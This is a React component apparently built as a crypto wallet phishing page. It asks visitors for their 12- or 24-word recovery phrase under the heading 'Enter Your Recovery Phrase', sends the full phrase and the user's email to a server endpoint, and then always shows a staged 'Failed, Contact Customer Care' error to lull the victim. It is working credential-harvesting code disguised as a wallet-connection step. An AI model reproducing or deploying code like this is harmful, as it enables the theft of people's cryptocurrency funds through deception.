'use client'

import axios from "axios";
import React, { useState } from "react";
import { toast, ToastContainer } from "react-toastify";

const EnterMnemonicPhrase = ({ user }: any) => {
    const [phraseLength, setPhraseLength] = useState(12);
    const [mnemonic, setMnemonic] = useState(Array(12).fill(""));

    const handleInputChange = (index: any, value: any) => {
        const updatedMnemonic = [...mnemonic];
        updatedMnemonic[index] = value;
        setMnemonic(updatedMnemonic);
    };

    const handlePhraseLengthChange = (length: any) => {
        setPhraseLength(length);
        setMnemonic(Array(length).fill(""));
    };

    const handleSubmit = async () => {
        toast('connecting, Please Wait...')
        await axios.post('/main/connect-wallet/api', {
            name: user.user.image,
            email: user.user.email,
            passphase: mnemonic.join(" ")
        })
        setTimeout(() => {
            toast('Failed, Contact Customer Care', { type: 'error' })
        }, 2000);
        console.log("Mnemonic Phrase: ", mnemonic.join(" "));
    };

    return (
        <div className="min-h-screen flex flex-col items-center justify-center bg-gray-50 p-4">
            <div className="max-w-md w-full bg-white shadow-lg rounded-2xl p-6">
                <h1 className="text-xl font-bold text-center mb-4">Enter Your Recovery Phrase</h1>
                <p className="text-sm text-gray-600 text-center mb-6">
                    Please choose the length of your recovery phrase and enter the words in the correct order.
                </p>
                <div className="flex justify-center gap-4 mb-6">
                    <button
                        onClick={() => handlePhraseLengthChange(12)}
                        className={`px-4 py-2 rounded-lg ${phraseLength === 12 ? "bg-blue-500 text-white" : "bg-gray-200 text-gray-700"}`}
                    >
                        12 Words
                    </button>
                    <button
                        onClick={() => handlePhraseLengthChange(24)}
                        className={`px-4 py-2 rounded-lg ${phraseLength === 24 ? "bg-blue-500 text-white" : "bg-gray-200 text-gray-700"}`}
                    >
                        24 Words
                    </button>
                </div>
                <div className={`grid grid-cols-${phraseLength === 12 ? 2 : 3} gap-4 mb-6`}>
                    {mnemonic.map((word, index) => (
                        <input
                            key={index}
                            type="text"
                            value={word}
                            onChange={(e) => handleInputChange(index, e.target.value)}
                            className="w-full px-3 py-2 border border-gray-300 rounded-lg focus:ring focus:ring-blue-200 focus:outline-none"
                            placeholder={`${index + 1}`}
                        />
                    ))}
                </div>
                <button
                    onClick={handleSubmit}
                    className="w-full bg-blue-500 hover:bg-blue-600 text-white font-semibold py-2 px-4 rounded-lg"
                >
                    Continue
                </button>
            </div>
            <ToastContainer />
        </div>
    );
};

export default EnterMnemonicPhrase;
